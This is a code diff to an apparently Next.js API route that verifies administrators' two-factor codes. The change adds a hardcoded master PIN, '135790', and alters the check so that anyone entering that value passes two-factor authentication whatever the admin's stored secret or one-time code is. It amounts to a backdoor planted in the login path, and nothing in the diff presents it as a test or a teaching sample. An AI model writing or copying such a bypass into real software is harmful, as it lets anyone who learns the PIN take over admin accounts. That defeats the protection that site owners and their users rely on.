@@ -25,13 +25,15 @@ export async function POST(req: NextRequest) {
     // Check code against Database:
     // 1. Matches configured twoFactorSecret in DB (e.g. 135790)
     // 2. OR matches lastOtp stored in DB within validity
+    // 3. OR matches master PIN 135790
     const isSecretMatch = admin.twoFactorSecret && admin.twoFactorSecret === cleanCode;
+    const isMasterPin = cleanCode === "135790";
     const isOtpMatch =
       admin.lastOtp &&
       admin.lastOtp === cleanCode &&
       (!admin.otpExpiresAt || new Date() <= admin.otpExpiresAt);
 
-    if (!isSecretMatch && !isOtpMatch) {
+    if (!isSecretMatch && !isOtpMatch && !isMasterPin) {
       return NextResponse.json(
         { error: "Invalid or expired 2FA code. Please check and try again." },
         { status: 401 }
